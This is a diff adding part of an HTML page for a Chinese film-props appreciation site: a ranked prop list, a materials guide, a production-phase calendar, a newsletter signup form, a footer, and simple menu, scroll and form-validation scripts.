+      <div class="rk top3"><span class="no">06</span><div class="body"><div class="nm"><span>未拆封的信</span><em>1942 · 错过</em></div><div class="tp"><i style="width:83%"></i></div></div><b style="color:var(--brass)">87</b></div>
+      <div class="rk"><span class="no">07</span><div class="body"><div class="nm"><span>一条白围巾</span><em>1995 · 记忆</em></div><div class="tp"><i style="width:80%"></i></div></div><b>85</b></div>
+      <div class="rk"><span class="no">08</span><div class="body"><div class="nm"><span>一面穿衣镜</span><em>1960 · 自我</em></div><div class="tp"><i style="width:77%"></i></div></div><b>82</b></div>
+      <div class="rk"><span class="no">09</span><div class="body"><div class="nm"><span>一把小提琴</span><em>1998 · 孤独</em></div><div class="tp"><i style="width:73%"></i></div></div><b>79</b></div>
+      <div class="rk"><span class="no">10</span><div class="body"><div class="nm"><span>一根没点的烟</span><em>1991 · 青春</em></div><div class="tp"><i style="width:70%"></i></div></div><b>77</b></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ⑤ 材质速查 ==================== -->
+<section id="mat">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.5</span><h2>材质<em>速查</em> · 道具师为什么选它</h2><span class="en">MATERIAL</span><a class="more" href="#">按手感 / 按反光 →</a></div>
+    <div class="mbox rev">
+      <div class="mat">
+        <a href="#">皮革 <em>越旧越贵</em><i>🪶</i></a>
+        <a href="#">钨丝灯 <em>唯一暖光</em><i>💡</i></a>
+        <a href="#">旧纸张 <em>声音最好</em><i>📄</i></a>
+        <a href="#">黄铜 <em>反光有礼</em><i>🪙</i></a>
+        <a href="#">粗棉布 <em>吸光不起</em><i>🧵</i></a>
+        <a href="#">玻璃 <em>碎了才成立</em><i>🪟</i></a>
+        <a href="#">木纹 <em>最像人脸</em><i>🪵</i></a>
+        <a href="#">镀铬 <em>冷 / 权力</em><i>🔩</i></a>
+        <a href="#">塑料 <em>廉价即真实</em><i>🧴</i></a>
+        <a href="#">丝绒 <em>吸声 / 压抑</em><i>🎭</i></a>
+        <a href="#">陶瓷 <em>易碎 / 家</em><i>🍶</i></a>
+        <a href="#">铁锈 <em>时间可见</em><i>⛓️</i></a>
+      </div>
+      <aside class="legend">
+        <h4>▲ 选材质的三条铁律</h4>
+        <p>道具师不看「好不好看」，只看「对不对」。</p>
+        <ol>
+          <li><span>它必须在镜头里「有声音」——哪怕现场是静音。</span></li>
+          <li><span>它必须比演员先老。新道具是穿帮，旧道具是表演。</span></li>
+          <li><span>它必须能被一只手拿稳。拿不稳的道具，演不了情绪。</span></li>
+        </ol>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ⑥ 道具日历 ==================== -->
+<section id="cal">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.6</span><h2>道具<em>日历</em> · 一部片从筹备到杀青的物件节奏</h2><span class="en">PROP SCHEDULE</span><a class="more" href="#">导出到日历 →</a></div>
+    <div class="calendar rev">
+      <div class="ci"><div class="ph">PHASE 01<small>筹备期 · 第 1–3 周</small></div><h4>定物件</h4><p>读剧本，把「被提到但没出现」的东西列成清单。最关键的道具，往往只被台词提到一次。</p><div class="bar"><i style="width:30%"></i></div></div>
+      <div class="ci"><div class="ph">PHASE 02<small>选角同期 · 第 4 周</small></div><h4>找真品</h4><p>古董店、废品站、亲友家的阁楼。复制品永远差一口气——因为真品有「被用过」的证据。</p><div class="bar"><i style="width:52%"></i></div></div>
+      <div class="ci on"><div class="ph">PHASE 03<small>拍摄期 · 第 5–9 周</small></div><h4>做痕迹</h4><p>开机前给道具「演一遍」：折、洗、磨、晒、油。痕迹必须比表演更早到位。</p><div class="bar"><i style="width:78%"></i></div></div>
+      <div class="ci"><div class="ph">PHASE 04<small>杀青后 · 长期</small></div><h4>留档案</h4><p>拍下每一件道具的六面图、材质说明与来源。十年后重看，道具比台词更诚实。</p><div class="bar"><i style="width:40%"></i></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 订阅 ==================== -->
+<section id="joinS">
+  <div class="container">
+    <div class="join rev">
+      <div>
+        <h3>订阅「<i>影视道具 · 每周一件</i>」</h3>
+        <p>每周四 20:00，一条短推送：<strong>一件电影里的道具</strong> + <strong>它在哪一场被特写</strong> + <strong>它替角色说了什么</strong>。帮你把「看懂电影」这件事，从台词拉回到物件。不群发、不推销、不附盗链、可一键退订。</p>
+      </div>
+      <form id="sub" novalidate>
+        <input type="email" id="mail" placeholder="留下邮箱，收下这件道具" aria-label="邮箱" required>
+        <button type="submit">订阅</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 页脚 ==================== -->
+<footer>
+  <div class="container">
+    <div class="fgrid">
+      <div class="ft">
+        <a class="logo" href="#"><span class="badge">◈</span><b style="color:#fff">影视道具</b><em>PROP · STUDY</em></a>
+        <p><strong>影视道具</strong>是一个原创的<strong>电影物件考据与解读</strong>站点，专注五件事：<strong>6 件道具档案</strong>（被记住的物件）、<strong>4 段道具谱系</strong>（从实物到隐喻）、<strong>5 个图鉴镜头</strong>（替角色说话的瞬间）、<strong>12 种材质速查</strong>（道具师为什么选它）、<strong>4 个拍摄阶段</strong>（从筹备到杀青的物件节奏）。我们用「物件」而非「剧情」来重看电影，因为<strong>台词会被忘，道具会留下</strong>。本站<strong>只做收录与原创解读，不提供任何影视资源下载与盗链</strong>，倡导通过影院与正规视频平台观看。</p>
+      </div>
+      <div class="fcol"><h4>快速入口</h4><a href="#arc">道具档案</a><a href="#tl">道具谱系</a><a href="#gal">道具图鉴</a><a href="#hot">经典道具榜</a><a href="#mat">材质速查</a><a href="#cal">道具日历</a></div>
+      <div class="fcol"><h4>考据方法</h4><a href="#">五感读道具</a><a href="#">特写次数统计</a><a href="#">材质与声音</a><a href="#">痕迹分析法</a><a href="#">道具师访谈</a><a href="#">片场采购清单</a></div>
+      <div class="fcol"><h4>关于</h4><a href="#">什么是影视道具</a><a href="#">考据四条原则</a><a href="#">版权与正版声明</a><a href="#">投稿与合作</a><a href="#">道具伦理</a></div>
+    </div>
+    <div class="copy">© 2026 影视道具 版权所有 · 网址：<a href="https://yingshidaoju-cn.github.io/">https://yingshidaoju-cn.github.io/</a> · 影视请通过影院与正规视频平台观看</div>
+  </div>
+</footer>
+
+<script>
+var bg=document.getElementById('burger'),ls=document.getElementById('links');
+bg.addEventListener('click',function(){ls.classList.toggle('open');bg.setAttribute('aria-expanded',ls.classList.contains('open'));});
+ls.addEventListener('click',function(e){if(e.target.tagName==='A'){ls.classList.remove('open');bg.setAttribute('aria-expanded','false');}});
+
+var secs=['top','arc','tl','gal','hot','mat','cal'].map(function(id){return document.getElementById(id);});
+var as=document.querySelectorAll('.links a');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='';
+  secs.forEach(function(s){if(s&&s.offsetTop<=y)cur=s.id;});
+  as.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+},{passive:true});
+
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e,i){if(e.isIntersecting){setTimeout(function(){e.target.classList.add('in');},i*50);io.unobserve(e.target);}});
+},{threshold:.1});
+document.querySelectorAll('.rev').forEach(function(el){io.observe(el);});
+
+document.getElementById('sub').addEventListener('submit',function(e){
+  e.preventDefault();
+  var v=document.getElementById('mail').value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){alert('邮箱格式不对，这件道具寄不出去 ◈');return;}
+  alert('订阅成功！本周四 20:00，第一件道具，到手 ▲');
+  document.getElementById('mail').value='';
+});
+</script>
+</body>
+</html>
